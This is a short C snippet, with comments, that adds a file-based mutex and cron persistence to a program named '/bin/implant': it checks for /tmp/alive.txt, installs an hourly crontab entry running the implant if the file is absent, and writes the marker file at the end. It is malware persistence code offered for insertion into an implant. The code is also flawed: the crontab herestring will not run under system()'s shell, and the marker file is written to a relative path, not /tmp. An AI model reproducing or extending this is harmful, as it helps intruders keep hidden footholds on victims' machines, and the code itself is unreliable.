//This goes in the header. It defines MUTEX.

#define MUTEX "/tmp/alive.txt"

//This goes into main at the very top. If the program finds alive.txt, it will exit out and end itself but if not, it will create a cronjob to run itself every hour on the hour.

#ifdef MUTEX
if(access( MUTEX, F_OK) != 0){
  system("crontab <<< 0 * * * * /bin/implant");
}
else{
  exit(1);
}
#endif

//This creates a file called alive.txt in the temp folder. It is used for the MUTEX. This goes in at the end of the code.
FILE *fp = NULL;
fp = fopen("alive.txt", "w");
